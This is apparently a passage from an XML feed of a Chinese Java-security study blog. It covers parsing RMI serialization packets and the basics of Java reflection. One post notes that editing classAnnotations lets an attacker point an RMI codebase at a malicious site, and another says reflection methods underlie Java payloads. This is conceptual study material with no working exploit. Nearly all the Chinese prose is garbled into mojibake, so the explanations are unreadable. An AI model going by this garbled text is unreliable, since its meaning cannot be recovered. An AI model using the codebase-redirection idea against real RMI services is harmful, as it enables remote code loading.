<h1 id="Javaå®‰å…¨-RMI-3"><a href="#Javaå®‰å…¨-RMI-3" class="headerlink" title="Javaå®‰å…¨[RMI(3)]"></a>Javaå®‰å…¨[RMI(3)]</h1><h2 id="æ•°æ®åŒ…è§£æä»¥åŠSerializationDumperå·¥å…·"><a href="#æ•°æ®åŒ…è§£æä»¥åŠSerializationDumperå·¥å…·" class="headerlink" title="æ•°æ®åŒ…è§£æä»¥åŠSerializationDumperå·¥å…·"></a>æ•°æ®åŒ…è§£æä»¥åŠSerializationDumperå·¥å…·</h2><p>è¿™é‡Œé€‰æ‹©çš„æ˜¯<code>JRMI,Call</code>çš„æ•°æ®åŒ…ï¼Œæ‰“å¼€å³é”®<code>Java Serialization</code>æ•°æ®æ®µï¼Œå¤åˆ¶<code>Hex Stream</code>ï¼Œçœ‹åˆ°<code>ac ed</code>å°±çŸ¥é“åé¢æ˜¯javaåºåˆ—åŒ–æ•°æ®</p>
<blockquote>
<p>æˆ‘ä»¬å¯ä»¥ç”¨ </p>
<p><code>tcp.stream eq 0</code> æ¥ç­›é€‰å‡ºæœ¬æœºä¸RMI Registryçš„æ•°æ®æµ</p>
<p><code>tcp.stream eq 1</code> æ¥ç­›é€‰å‡ºæœ¬æœºä¸RMI Serverçš„æ•°æ®æµ</p>
</blockquote>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(3)]/image-20231025005115061.png" alt="image-20231025005115061"></p>
<p>å°†å¤åˆ¶çš„<code>Hex Stream</code>ç”¨å·¥å…·è§£æ</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(3)]/image-20231025005053560.png" alt="image-20231025005053560"></p>
<p>ä½†æ˜¯æœ‰å¾ˆå¤šå‚æ•°çœ‹ä¸æ‡‚ï¼Œå¯ä»¥çœ‹çœ‹Javaåºåˆ—åŒ–çš„åè®®æ–‡æ¡£ï¼š<code>https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html</code></p>
<p>è¿™ç¯‡æ–‡æ¡£é‡Œç”¨äº†ä¸€ç§ç±»ä¼¼BNFï¼ˆå·´ç§‘æ–¯èŒƒå¼ï¼‰çš„å½¢å¼æè¿°äº†åºåˆ—åŒ–æ•°æ®çš„è¯­æ³•ï¼Œæ¯”å¦‚æˆ‘ä»¬è¿™é‡Œçš„è¿™æ®µç®€ å•çš„æ•°æ®ï¼Œå…¶æ¶‰åŠåˆ°å¦‚ä¸‹è¯­æ³•è§„åˆ™ï¼š </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">stream:</span><br><span class="line">magic version contents</span><br><span class="line">contents:</span><br><span class="line">content</span><br><span class="line">contents content</span><br><span class="line">content:</span><br><span class="line">object</span><br><span class="line">blockdata</span><br><span class="line">object:</span><br><span class="line">newObject</span><br><span class="line">newClass</span><br><span class="line">newArray</span><br><span class="line">newString</span><br><span class="line">newEnum</span><br><span class="line">newClassDesc</span><br><span class="line">prevObject</span><br><span class="line">nullReference</span><br><span class="line">exception</span><br><span class="line">TC_RESET</span><br><span class="line">blockdata:</span><br><span class="line">blockdatashort</span><br><span class="line">blockdatalong</span><br><span class="line">blockdatashort:</span><br><span class="line">TC_BLOCKDATA (unsigned <span class="type">byte</span>)&lt;size&gt; (<span class="type">byte</span>)[size]</span><br><span class="line">newString:</span><br><span class="line">TC_STRING <span class="title function_">newHandle</span> <span class="params">(utf)</span></span><br><span class="line">TC_LONGSTRING <span class="title function_">newHandle</span> <span class="params">(<span class="type">long</span>-utf)</span></span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ <code>TC_BLOCKDATA</code> è¿™éƒ¨åˆ†å¯¹åº”çš„æ˜¯ <code>contents -&gt; content -&gt; blockdata -&gt; blockdatashort</code> ï¼Œ <code>TC_STRING</code> è¿™éƒ¨åˆ†å¯¹åº”çš„æ˜¯ <code>contents -&gt; content -&gt; object-&gt; newString</code> ã€‚éƒ½å¯ä»¥åœ¨æ–‡æ¡£é‡Œæ‰¾åˆ°å®Œ æ•´çš„è¯­æ³•å®šä¹‰ã€‚ è¿™ä¸€æ•´ä¸ªåºåˆ—åŒ–å¯¹è±¡ï¼Œå…¶å®æè¿°çš„å°±æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå…¶å€¼æ˜¯ <code>refObj</code> ã€‚æ„æ€æ˜¯è·å–è¿œç¨‹çš„ <code>refObj</code> å¯¹ è±¡ã€‚</p>
<p><code>JRMI,ReturnData</code>æ•°æ®åŒ…å¤§ä¸€äº›ï¼Œä¸‹é¢ç”¨å®ƒæ¥å±•ç¤º</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">  TC_BLOCKDATA - <span class="number">0x77</span></span><br><span class="line">    Length - <span class="number">15</span> - <span class="number">0x0f</span></span><br><span class="line">    Contents - <span class="number">0x0120dea1410000018b3e3ad3308005</span></span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_PROXYCLASSDESC - <span class="number">0x7d</span></span><br><span class="line">      newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">00</span></span><br><span class="line">      Interface count - <span class="number">2</span> - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">02</span></span><br><span class="line">      proxyInterfaceNames</span><br><span class="line">        <span class="number">0</span>:</span><br><span class="line">          Length - <span class="number">15</span> - <span class="number">0x00</span> <span class="number">0f</span></span><br><span class="line">          Value - java.rmi.Remote - <span class="number">0x6a6176612e726d692e52656d6f7465</span></span><br><span class="line">        <span class="number">1</span>:</span><br><span class="line">          Length - <span class="number">11</span> - <span class="number">0x00</span> 0b</span><br><span class="line">          Value - RMI_2.ICalc - <span class="number">0x524d495f322e4943616c63</span></span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_NULL - <span class="number">0x70</span></span><br><span class="line">        TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">          className</span><br><span class="line">            Length - <span class="number">23</span> - <span class="number">0x00</span> <span class="number">17</span></span><br><span class="line">            Value - java.lang.reflect.Proxy - <span class="number">0x6a6176612e6c616e672e7265666c6563742e50726f7879</span></span><br><span class="line">          serialVersionUID - <span class="number">0xe1</span> <span class="number">27</span> da <span class="number">20</span> cc <span class="number">10</span> <span class="number">43</span> cb</span><br><span class="line">          newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">01</span></span><br><span class="line">          classDescFlags - <span class="number">0x02</span> - SC_SERIALIZABLE</span><br><span class="line">          fieldCount - <span class="number">1</span> - <span class="number">0x00</span> <span class="number">01</span></span><br><span class="line">          Fields</span><br><span class="line">            <span class="number">0</span>:</span><br><span class="line">              Object - L - <span class="number">0x4c</span></span><br><span class="line">              fieldName</span><br><span class="line">                Length - <span class="number">1</span> - <span class="number">0x00</span> <span class="number">01</span></span><br><span class="line">                Value - h - <span class="number">0x68</span></span><br><span class="line">              className1</span><br><span class="line">                TC_STRING - <span class="number">0x74</span></span><br><span class="line">                  newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">02</span></span><br><span class="line">                  Length - <span class="number">37</span> - <span class="number">0x00</span> <span class="number">25</span></span><br><span class="line">                  Value - Ljava/lang/reflect/InvocationHandler; - <span class="number">0x4c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b</span></span><br><span class="line">          classAnnotations</span><br><span class="line">            TC_NULL - <span class="number">0x70</span></span><br><span class="line">            TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">          superClassDesc</span><br><span class="line">            TC_NULL - <span class="number">0x70</span></span><br><span class="line">    newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">03</span></span><br><span class="line">    classdata</span><br><span class="line">      java.lang.reflect.Proxy</span><br><span class="line">        values</span><br><span class="line">          <span class="title function_">h</span></span><br><span class="line">            <span class="params">(object)</span></span><br><span class="line">              TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">                TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">                  className</span><br><span class="line">                    Length - <span class="number">45</span> - <span class="number">0x00</span> <span class="number">2d</span></span><br><span class="line">                    Value - java.rmi.server.RemoteObjectInvocationHandler - <span class="number">0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572</span></span><br><span class="line">                  serialVersionUID - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">02</span></span><br><span class="line">                  newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">04</span></span><br><span class="line">                  classDescFlags - <span class="number">0x02</span> - SC_SERIALIZABLE</span><br><span class="line">                  fieldCount - <span class="number">0</span> - <span class="number">0x00</span> <span class="number">00</span></span><br><span class="line">                  classAnnotations</span><br><span class="line">                    TC_NULL - <span class="number">0x70</span></span><br><span class="line">                    TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">                  superClassDesc</span><br><span class="line">                    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">                      className</span><br><span class="line">                        Length - <span class="number">28</span> - <span class="number">0x00</span> 1c</span><br><span class="line">                        Value - java.rmi.server.RemoteObject - <span class="number">0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374</span></span><br><span class="line">                      serialVersionUID - <span class="number">0xd3</span> <span class="number">61</span> b4 <span class="number">91</span> 0c <span class="number">61</span> <span class="number">33</span> 1e</span><br><span class="line">                      newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">05</span></span><br><span class="line">                      classDescFlags - <span class="number">0x03</span> - SC_WRITE_METHOD | SC_SERIALIZABLE</span><br><span class="line">                      fieldCount - <span class="number">0</span> - <span class="number">0x00</span> <span class="number">00</span></span><br><span class="line">                      classAnnotations</span><br><span class="line">                        TC_NULL - <span class="number">0x70</span></span><br><span class="line">                        TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">                      superClassDesc</span><br><span class="line">                        TC_NULL - <span class="number">0x70</span></span><br><span class="line">                newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">06</span></span><br><span class="line">                classdata</span><br><span class="line">                  java.rmi.server.RemoteObject</span><br><span class="line">                    values</span><br><span class="line">                    objectAnnotation</span><br><span class="line">                      TC_BLOCKDATA - <span class="number">0x77</span></span><br><span class="line">                        Length - <span class="number">56</span> - <span class="number">0x38</span></span><br><span class="line">                        Contents - <span class="number">0x000a556e6963617374526566000f3139322e3136382e3136392e3134360000c5b2e3476369ea6a56e120dea1410000018b3e3ad330800101</span></span><br><span class="line">                      TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">                  java.rmi.server.RemoteObjectInvocationHandler</span><br><span class="line">                    values</span><br><span class="line">      &lt;Dynamic Proxy Class&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ä¸ª<code>java.lang.reflect.Proxy</code>å¯¹è±¡ï¼Œå…¶ä¸­æœ‰æ®µæ•°æ®å­˜å‚¨åœ¨<code>objectAnnotation</code>ä¸­:<code>0x000a556e6963617374526566000f3139322e3136382e3136392e3134360000c5b2e3476369ea6a56e120dea1410000018b3e3ad330800101</code></p>
<p>è¿™æ®µæ•°æ®è®°å½•äº†RMI Serverçš„åœ°å€å’Œç«¯å£ã€‚</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(3)]/image-20231025010959831.png" alt="image-20231025010959831"></p>
<p>ç„¶åå†çœ‹çœ‹ï¼Œæœ¬æœºä¸RMI Serverçš„äº¤äº’ï¼Œè™½ç„¶wiresharkæ²¡æœ‰è¯†åˆ«å‡ºRMIï¼Œä½†æ˜¯ä»æ•°æ®åŒ…ä¸­å¯ä»¥çœ‹åˆ°<code>50 ac ed</code>ï¼Œæ‰€ä»¥æ˜¯å­˜åœ¨åºåˆ—åŒ–æ•°æ®ï¼Œä¸€æ ·ç”¨å·¥å…·è§£æè¯•è¯•ï¼Œåªä¿ç•™<code>ac ed</code>å¼€å¤´ã€‚</p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(3)]/image-20231025011457922.png" alt="image-20231025011457922"></p>
<p><img src="/post/Java%E5%AE%89%E5%85%A8[RMI(3)]/image-20231025012001967.png" alt="image-20231025012001967"></p>
<p>å¯ä»¥çœ‹åˆ°<code>codebase</code>æ˜¯é€šè¿‡è¿‡ <code>java.rmi.server.Obj</code>;çš„ <code>classAnnotations</code> ä¼ é€’çš„ã€‚</p>
<p>&#x3D; &gt;å³ä½¿æˆ‘ä»¬æ²¡æœ‰RMIçš„å®¢æˆ·ç«¯ï¼Œåªéœ€è¦ä¿®æ”¹ <code>classAnnotations</code> çš„å€¼ï¼Œå°±èƒ½æ§åˆ¶<code>codebase</code>ï¼Œä½¿å…¶ æŒ‡å‘æ”»å‡»è€…çš„æ¶æ„ç½‘ç«™ã€‚</p>
<h2 id="classAnnotationsæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#classAnnotationsæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="classAnnotationsæ˜¯ä»€ä¹ˆï¼Ÿ"></a>classAnnotationsæ˜¯ä»€ä¹ˆï¼Ÿ</h2><blockquote>
<p>åœ¨åºåˆ—åŒ–Javaç±»çš„æ—¶å€™ç”¨åˆ°äº†ä¸€ä¸ªç±»ï¼Œå« <code>ObjectOutputStream</code> ã€‚è¿™ä¸ªç±»å†…éƒ¨æœ‰ä¸€ä¸ªæ–¹æ³• <code>annotateClass</code> ï¼Œ <code>ObjectOutputStream</code> çš„å­ç±»æœ‰éœ€è¦å‘åºåˆ—åŒ–åçš„æ•°æ®é‡Œæ”¾ä»»ä½•å†…å®¹ï¼Œéƒ½å¯ä»¥é‡å†™ è¿™ä¸ªæ–¹æ³•ï¼Œå†™å…¥ä½ è‡ªå·±æƒ³è¦å†™å…¥çš„æ•°æ®ã€‚ç„¶åååºåˆ—åŒ–æ—¶ï¼Œå°±å¯ä»¥è¯»å–åˆ°è¿™ä¸ªä¿¡æ¯å¹¶ä½¿ç”¨ã€‚</p>
<p>æ¯”å¦‚ï¼Œæˆ‘ä»¬RMIçš„ç±» MarshalOutputStream å°±å°†å½“å‰çš„ codebase å†™å…¥ï¼š </p>
<ul>
<li><code>https://github.com/JetBrains/jdk8u_jdk/blob/8db9d62a1cfe07fd4260b83ae86e39f80c0a9ff2/src/share/classes/java/rmi/server/RMIClassLoader.java#L657</code> </li>
<li><code>https://github.com/JetBrains/jdk8u_jdk/blob/8db9d62a1c/src/share/classes/sun/rmi/server/LoaderHandler.java#L282</code></li>
</ul>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬åœ¨åˆ†æåºåˆ—åŒ–æ•°æ®æ—¶çœ‹åˆ°çš„ classAnnotations ï¼Œå®é™…ä¸Šå°±æ˜¯ annotateClass æ–¹æ³•å†™å…¥çš„ å†…å®¹ã€‚</p>
</blockquote>
]]></content>
      <categories>
        <category>Javaæ¼«è°ˆå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaå®‰å…¨[åå°„(1)]</title>
    <url>//post/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(1)%5D/</url>
    <content><![CDATA[<blockquote>
<p>â€œç±»åˆå§‹åŒ–â€å’Œâ€œç±»å®ä¾‹åŒ–â€ä¸¥æ ¼åŒºåˆ†</p>
</blockquote>
<span id="more"></span>

<h1 id="Javaå®‰å…¨-åå°„-1"><a href="#Javaå®‰å…¨-åå°„-1" class="headerlink" title="Javaå®‰å…¨[åå°„(1)]"></a>Javaå®‰å…¨[åå°„(1)]</h1><h2 id="åå°„çš„æ¦‚å¿µ"><a href="#åå°„çš„æ¦‚å¿µ" class="headerlink" title="åå°„çš„æ¦‚å¿µ"></a>åå°„çš„æ¦‚å¿µ</h2><blockquote>
<p>åå°„æ˜¯å¤§å¤šæ•°è¯­è¨€ä¸å¯å°‘çš„ä¸€éƒ¨åˆ†ï¼Œ</p>
<p>æŒ‡åœ¨ç¨‹åºè¿è¡Œä¸­ï¼Œ<code>å¯¹äºä»»ä½•ä¸€ä¸ªç±»ï¼Œéƒ½å¯ä»¥é€šè¿‡åå°„æ‹¿åˆ°æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼ˆåŒ…å«ç§æœ‰ï¼‰</code>ï¼Œ</p>
<p>æ‹¿åˆ°çš„æ–¹æ³•å¯ä»¥è°ƒç”¨ï¼Œæ€»ä¹‹é€šè¿‡åå°„ï¼Œæˆ‘ä»¬å¯ä»¥è’‹Javaè¿™ç§é™æ€çš„è¯­è¨€é™„åŠ ä¸ŠåŠ¨æ€çš„ç‰¹æ€§ã€‚</p>
<p><code>åå°„æ˜¯æŒ‡è¿è¡Œæ—¶æ£€æŸ¥å’Œæ“ä½œç±»ã€æ¥å£ã€å­—æ®µã€æ–¹æ³•ç­‰ç¨‹åºç»“æ„çš„èƒ½åŠ›ã€‚</code></p>
<blockquote>
<p>Javaçš„åå°„æ˜¯æŒ‡ç¨‹åºåœ¨è¿è¡ŒæœŸå¯ä»¥æ‹¿åˆ°ä¸€ä¸ªå¯¹è±¡çš„æ‰€æœ‰ä¿¡æ¯ã€‚</p>
<p>å®ƒå…è®¸è¿è¡Œä¸­çš„ Java ç¨‹åºå¯¹è‡ªèº«è¿›è¡Œæ£€æŸ¥ï¼Œæˆ–è€…è¯´â€œè‡ªå®¡â€ï¼Œå¹¶èƒ½ç›´æ¥æ“ä½œç¨‹åºçš„å†…éƒ¨å±æ€§å’Œæ–¹æ³•ã€‚</p>
</blockquote>
</blockquote>
<h2 id="Classå¯¹è±¡ä¸åå°„çš„å…³ç³»"><a href="#Classå¯¹è±¡ä¸åå°„çš„å…³ç³»" class="headerlink" title="*Classå¯¹è±¡ä¸åå°„çš„å…³ç³»"></a>*Classå¯¹è±¡ä¸åå°„çš„å…³ç³»</h2><blockquote>
<p><code>Classå¯¹è±¡</code>æ˜¯<code>Javaåå°„æœºåˆ¶çš„å…¥å£</code>ï¼Œå®ƒ<code>å°è£…äº†ä¸€ä¸ªç±»æˆ–æ¥å£çš„è¿è¡Œæ—¶ä¿¡æ¯</code>ã€‚</p>
<p>é€šè¿‡<code>è°ƒç”¨Classç±»çš„æ–¹æ³•</code>ï¼Œå¯ä»¥è·å–è¿™äº›ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç±»çš„<code>æ„é€ å‡½æ•°ã€æ–¹æ³•ã€å±æ€§</code>ç­‰ã€‚</p>
<p>è¿™äº›ä¿¡æ¯å¯ä»¥ç”¨æ¥<code>åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°åˆ›å»ºå¯¹è±¡ã€è°ƒç”¨æ–¹æ³•å’Œè®¿é—®å­—æ®µ</code></p>
</blockquote>
<h2 id="Classå¯¹è±¡ä¸Classçš„å…³ç³»"><a href="#Classå¯¹è±¡ä¸Classçš„å…³ç³»" class="headerlink" title="Classå¯¹è±¡ä¸Classçš„å…³ç³»"></a>Classå¯¹è±¡ä¸Classçš„å…³ç³»</h2><blockquote>
<p>æ¯ä¸€ä¸ªç±»éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„Classå¯¹è±¡,å®ƒå°è£…äº†è¯¥ç±»çš„è¿è¡Œæ—¶ä¿¡æ¯ã€‚ </p>
</blockquote>
<h2 id="Classå¯¹è±¡ä¸å®ä¾‹å¯¹è±¡çš„å…³ç³»"><a href="#Classå¯¹è±¡ä¸å®ä¾‹å¯¹è±¡çš„å…³ç³»" class="headerlink" title="Classå¯¹è±¡ä¸å®ä¾‹å¯¹è±¡çš„å…³ç³»"></a>Classå¯¹è±¡ä¸å®ä¾‹å¯¹è±¡çš„å…³ç³»</h2><blockquote>
<p>Classå¯¹è±¡è¡¨ç¤ºç±»è¿è¡Œæ—¶çš„ä¿¡æ¯ï¼Œè€Œå®ä¾‹å¯¹è±¡åˆ™æ˜¯ç±»çš„ä¸€ä¸ªå…·ä½“å®ä¾‹ã€‚</p>
<p>æ¯ä¸ªå®ä¾‹å¯¹è±¡éƒ½å±äºä¸€ä¸ªç‰¹å®šçš„ç±»ï¼Œå¹¶ä¸”ä¸è¯¥ç±»çš„Classå¯¹è±¡ç›¸å…³è”ã€‚</p>
<p>å¯ä»¥é€šè¿‡å®ä¾‹å¯¹è±¡æ¥è·å–å…¶æ‰€å±ç±»çš„Classå¯¹è±¡ï¼Œä¹Ÿå¯é€šè¿‡Classå¯¹è±¡æ¥åˆ›å»ºå®ä¾‹å¯¹è±¡ã€‚</p>
</blockquote>
<h2 id="åå°„ä¾‹å­"><a href="#åå°„ä¾‹å­" class="headerlink" title="*åå°„ä¾‹å­"></a>*åå°„ä¾‹å­</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">     <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">     clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„ä¾‹å­ä¸­,è¿™å‡ ä¸ªæ–¹æ³•åŒ…æ½äº†å‡ ä¸ªåœ¨åå°„ä¸­æä¸ºé‡è¦çš„æ–¹æ³•</p>
<blockquote>
<ul>
<li><p>è·å–ç±»çš„æ–¹æ³•: <code>forName</code></p>
</li>
<li><p>å®ä¾‹åŒ–ç±»å¯¹è±¡çš„æ–¹æ³•: <code>newInstance</code></p>
<blockquote>
<p>ä»java9å¼€å§‹ï¼Œå»ºè®®ä½¿ç”¨<code>getDeclaredConstructor().newInstance()</code>æ¥ä»£æ›¿<code>newInstance</code>æ–¹æ³•ï¼Œå› ä¸º<code>newInstance</code>æ–¹æ³•ä¼šæŠ›å‡ºä¸å¿…è¦çš„</p>
<p><code>InstantiationException</code>å’Œ<code>IllegalAccessException</code>å¼‚å¸¸ï¼Œè€Œä¸”å®ƒä¹Ÿä¸å¤Ÿæ¸…æ™°åœ°è¡¨æ˜æ­£åœ¨è°ƒç”¨æ„é€ å‡½æ•°ã€‚</p>
</blockquote>
</li>
<li><p>è·å¾—å‡½æ•°çš„æ–¹æ³•: <code>getMethod</code></p>
</li>
<li><p>æ‰§è¡Œå‡½æ•°çš„æ–¹æ³•: <code>invoke</code></p>
</li>
</ul>
</blockquote>
<p>ä»¥ä¸Šçš„å››ç§æ–¹æ³•å‡ ä¹åŒ…æ½æ‰€æœ‰<code>Java</code>å®‰å…¨ä¸­å„ç§å‘å°„æœ‰å…³çš„<code>payload</code></p>
<hr>
<h4 id="Javaåå°„è¿ç”¨å®ä¾‹"><a href="#Javaåå°„è¿ç”¨å®ä¾‹" class="headerlink" title="Javaåå°„è¿ç”¨å®ä¾‹"></a>Javaåå°„è¿ç”¨å®ä¾‹</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨ forName æ–¹æ³•è·å–ç±»çš„ Class å¯¹è±¡</span></span><br><span class="line">        <span class="comment">// æ­¤å¤„è·å¾—MyClassç±»çš„Classå¯¹è±¡</span></span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;MyClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿ç”¨ newInstance æ–¹æ³•å®ä¾‹åŒ–ç±»å¯¹è±¡</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> cls.getDeclaredConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// String.class ä»£è¡¨å‚æ•°ç±»å‹ä¸º String çš„æ–¹æ³•</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;sayHello&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ‰§è¡Œæ–¹æ³•</span></span><br><span class="line">        <span class="comment">// ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç±»å¯¹è±¡ï¼Œåé¢çš„å‚æ•°ä¸ºæ–¹æ³•çš„å‚æ•°</span></span><br><span class="line">        method.invoke(obj, <span class="string">&quot;John&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œæˆªå›¾ï¼Œè·å–<code>Myclass</code>ç±»å¯¹è±¡ï¼Œç„¶åè°ƒç”¨<code>Myclass</code>ä¸­çš„æ–¹æ³•<code>sayHello</code>ï¼Œä¸»å‡½æ•°è¯´æ˜å‚æ•°ç±»å‹<code>String.class</code>å¹¶ä¼ å‚<code>John</code></p>
<img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230816215846754.png" alt="image-20230816215846754" style="zoom:50%;">

<blockquote>
<p><code>Myclassç±»</code>å¯ä»¥åœ¨<code>src</code>ç›®å½•ä»¥ç‹¬ç«‹çš„æ–‡ä»¶æ ¼å¼å­˜åœ¨<code>Myclass.class</code></p>
<p>ä½†æ˜¯ä¸èƒ½åœ¨<code>src</code>ç›®å½•ä¸‹å­˜åœ¨ä¸¤ä¸ªç›¸åŒåå­—çš„ç±»ï¼Œ</p>
<p>åœ¨è¿›è¡Œåå°„æ—¶ä¼šå‘ç”ŸæŠ¥é”™ï¼š<code>ç±»é‡å¤</code></p>
</blockquote>
<img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230816205947106.png" alt="image-20230816205947106" style="zoom:50%;">

<hr>
<h2 id="è·å–ç±»çš„ä¸‰ä¸ªæ–¹æ³•"><a href="#è·å–ç±»çš„ä¸‰ä¸ªæ–¹æ³•" class="headerlink" title="è·å–ç±»çš„ä¸‰ä¸ªæ–¹æ³•"></a>è·å–ç±»çš„ä¸‰ä¸ªæ–¹æ³•</h2><p>é€šå¸¸æˆ‘ä»¬æœ‰<code>ä¸‰ç§æ–¹æ³•</code>è·å–ä¸€ä¸ªâ€ç±»â€,ä¹Ÿå°±æ˜¯<code>java.lang.Class</code>å¯¹è±¡</p>
<blockquote>
<p><code>forName</code>ä¸æ˜¯è·å–â€ç±»â€çš„å”¯ä¸€é€”å¾„ã€‚</p>
</blockquote>
<h3 id="obj-getClass"><a href="#obj-getClass" class="headerlink" title="obj.getClass()"></a>obj.getClass()</h3><blockquote>
<p>å¦‚æœä¸Šä¸‹æ–‡å­˜åœ¨æŸä¸ªå®ä¾‹<code>obj</code>,é‚£ä¹ˆå¯ä»¥é€šè¿‡<code>obj.getClass()</code>æ¥è·å–å®ƒçš„ç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">        Class&lt;?&gt; cls = obj.getClass();</span><br><span class="line">        System.out.println(<span class="string">&quot;Class Name: &quot;</span> + cls.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="comment">// ç±»çš„å®šä¹‰</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ª<code>obj</code>å¯¹è±¡<code>MyClass</code>å®ä¾‹</p>
<img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230816215442026.png" alt="image-20230816215442026" style="zoom:50%;">

<p>ä¸¤ä¸ª<code>obj</code>å¯¹è±¡<code>MyClass</code>å’Œ<code>YourClass</code>å®ä¾‹</p>
<img src="/post/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(1)]/image-20230816215755720.png" alt="image-20230816215755720" style="zoom:50%;">
</blockquote>
<h3 id="class-ä¸å±äºåå°„"><a href="#class-ä¸å±äºåå°„" class="headerlink" title=".class[ä¸å±äºåå°„]"></a>.class[ä¸å±äºåå°„]</h3><blockquote>
